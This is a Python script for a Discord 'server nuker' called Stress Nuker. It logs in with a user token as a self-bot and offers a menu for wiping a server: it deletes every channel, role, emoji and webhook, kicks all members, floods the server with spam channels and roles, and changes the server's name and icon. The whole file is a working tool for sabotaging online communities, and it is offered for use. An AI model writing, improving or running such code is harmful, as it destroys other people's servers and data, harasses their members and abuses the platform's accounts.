import discord
import asyncio
import json
import requests
import os
import ctypes
import pyfiglet
import colorama
from colorama import Fore, Style, init

colorama.init()

col = {
    "BLUE": (100, 125, 238),
    "LIGHTPURPLE_EX": (127, 83, 172),
    "WHITE": (255, 255, 255),
}

os.system(f'mode 85,35')


def gradient_print(text, start_color, end_color):
    init(autoreset=True)
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i, char in enumerate(text):
        ratio = i / (len(text) - 1)
        current_r = int(start_r + (end_r - start_r) * ratio)
        current_g = int(start_g + (end_g - start_g) * ratio)
        current_b = int(start_b + (end_b - start_b) * ratio)
        print(f"\033[38;2;{current_r};{current_g};{current_b}m{char}\033[0m", end='')


async def nuke_channels(guild):
    quantity = int(input("Enter the quantity of channels to create $ "))
    await delete_channels(guild)
    await create_channels(guild, quantity)


async def nuke_roles(guild):
    quantity = int(input("Enter the quantity of roles to create $ "))
    await delete_roles(guild)
    await create_roles(guild, quantity)


async def delete_roles(guild):
    for role in guild.roles:
        try:
            await role.delete()
            print(f"Deleted role $ {role.name}")
        except Exception as e:
            print(f"Failed to delete role $ {role.name} ({e})")
        await asyncio.sleep(0.01)


async def create_roles(guild, quantity):
    for i in range(quantity):
        try:
            await guild.create_role(name=f"stress nuker {i+1}")
            print(f"Created role $ stress nuker {i+1}")
        except Exception as e:
            print(f"Failed to create role $ stress nuker {i+1} ({e})")
        await asyncio.sleep(0.01)


async def delete_channels(guild):
    tasks = []
    for channel in guild.channels:
        tasks.append(channel.delete())
    await asyncio.gather(*tasks)
    print("Deleted channels")


async def create_channels(guild, quantity):
    for i in range(quantity):
        try:
            await guild.create_text_channel(name=f"stress-nuker-{i+1}")
            print(f"Created channel $ stress-nuker-{i+1}")
        except Exception as e:
            print(f"Failed to create channel $ stress-nuker-{i+1} ({e})")
        await asyncio.sleep(0.01)


async def create_categories(guild):
    quantity = int(input("Enter the quantity of categories to create $ "))
    for i in range(quantity):
        try:
            await guild.create_category(name=f"stress-{i+1}")
            print(f"Created category $ stress-{i+1}")
        except Exception as e:
            print(f"Failed to create category $ stress-{i+1} ({e})")
        await asyncio.sleep(0.01)


async def change_guild_picture(guild):
    picture_url = input("Enter the URL of the new guild picture $ ")
    try:
        await guild.edit(icon=requests.get(picture_url).content)
        print("Changed guild picture")
    except Exception as e:
        print(f"Failed to change guild picture$ {e}")
    await asyncio.sleep(0.01)


async def change_guild_name(guild):
    new_name = input("Enter the new guild name $ ")
    try:
        await guild.edit(name=new_name)
        print(f"Changed guild name to $ {new_name}")
    except Exception as e:
        print(f"Failed to change guild name $ {e}")
    await asyncio.sleep(0.01)


async def total_nuke(guild):
    quantity_channels = int(input("Enter the quantity of channels to create $ "))
    quantity_roles = int(input("Enter the quantity of roles to create $ "))
    picture_url = input("Enter the URL of the new guild picture $ ")
    new_name = input("Enter the new guild name $ ")
    await kick_all_members(guild)
    await delete_channels(guild)
    await create_channels(guild, quantity_channels)
    await delete_roles(guild)
    await create_roles(guild, quantity_roles)

    try:
        await guild.edit(icon=requests.get(picture_url).content)
        print("Changed guild picture")
    except Exception as e:
        print(f"Failed to change guild picture: {e}")

    try:
        await guild.edit(name=new_name)
        print(f"Changed guild name to: {new_name}")
    except Exception as e:
        print(f"Failed to change guild name: {e}")

    await asyncio.sleep(0.01)


async def kick_all_members(guild):
    confirm = input("Are you sure you want to kick all members? (y/n) $ ")
    if confirm.lower() == "y":
        for member in guild.members:
            try:
                await member.kick(reason="Kicked by Stress Nuker")
                print(f"Kicked member $ {member.name}#{member.discriminator}")
            except Exception as e:
                print(f"Failed to kick member $ {member.name}#{member.discriminator} ({e})")
            await asyncio.sleep(0.01)
    else:
        print("Kick all members operation canceled.")

async def delete_all_emojis(guild):
    for emoji in guild.emojis:
        try:
            await emoji.delete()
            print(f"Deleted emoji $ {emoji.name}")
        except Exception as e:
            print(f"Failed to delete emoji $ {emoji.name} ({e})")
        await asyncio.sleep(0.01)


async def delete_all_webhooks(guild):
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                    print(f"Deleted webhook $ {webhook.name}")
                except Exception as e:
                    print(f"Failed to delete webhook $ {webhook.name} ({e})")
                await asyncio.sleep(0.01)



async def options_menu(client, guild):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        gradient_print(f"""
     ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
    ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
    ▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌          
    ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
     ▀▀▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
              ▐░▌     ▐░▌     ▐░▌     ▐░▌  ▐░▌                    ▐░▌          ▐░▌
     ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
    ▐░░░░░░░░░░░▌     ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
     ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀                                                                                                                                                                     
                                              
                           Server Nuking Utility                           
                           https://github.com/e0i     
                           ╔═══════════════════════════════╗
                           ║            OPTIONS:           ║              
                           ║═══════════════════════════════║ 
                           ║[1] - Nuke Channels            ║
                           ║[2] - Nuke Roles               ║                    
                           ║[3] - Create Categories        ║       
                           ║[4] - Change Guild Logo        ║ 
                           ║[5] - Change Guild Name        ║
                           ║[6] - Kick All Members         ║     
                           ║[7] - Delete Emojis            ║ 
                           ║[8] - Delete Webhooks          ║   
                           ║[9] - Total Nuke               ║                 
                           ║[Q] - Quit                     ║
                           ╚═══════════════════════════════╝                                                         
""", start_color=col["BLUE"], end_color=col["LIGHTPURPLE_EX"])
        choice = input("Choose an option " + Fore.LIGHTMAGENTA_EX + "$ " + Fore.RESET)
        if choice == "1":
            os.system(f'title [Stress Nuker - Channel Nuker]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await nuke_channels(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "2":
            os.system(f'title [Stress Nuker - Role Nuker]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await nuke_roles(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "3":
            os.system(f'title [Stress Nuker - Category Creator]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await create_categories(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "4":
            os.system(f'title [Stress Nuker - Logo Changer]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await change_guild_picture(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "5":
            os.system(f'title [Stress Nuker - Title Changer]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await change_guild_name(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "6":
            os.system(f'title [Stress Nuker - Kick All Members]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await kick_all_members(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice == "7":
            os.system(f'title [Stress Nuker - Delete Emojis]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await delete_all_emojis(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice =="8":
            os.system(f'title [Stress Nuker - Webhook Deleter]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await delete_all_webhooks(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")
        elif choice =="9":
            os.system(f'title [Stress Nuker - Total Nuke]')
            os.system('cls' if os.name == 'nt' else 'clear')
            await total_nuke(guild)
            os.system(f'title [Stress Nuker - Menu]')
            input("Press Enter to continue...")

        elif choice.lower() == "q":
            exit()
        else:
            print("Invalid input. Please enter a valid option.")


os.system(f'title [Stress Nuker - Entry]')
token = input("Enter your Discord token: ")
if len(token) == 0:
    raise Exception('Token cannot be empty')

guild_id = input("\nEnter the Guild ID to nuke $ ")
if len(guild_id) == 0:
    raise Exception('Guild ID cannot be empty')

client = discord.Client(intents=discord.Intents.all())
os.system(f'title [Stress Nuker - Menu]')


@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    if guild is None:
        print(f"Failed to find guild with ID: {guild_id}")
        await client.close()
        return

    while True:
        await options_menu(client, guild)


client.run(token, bot=False)
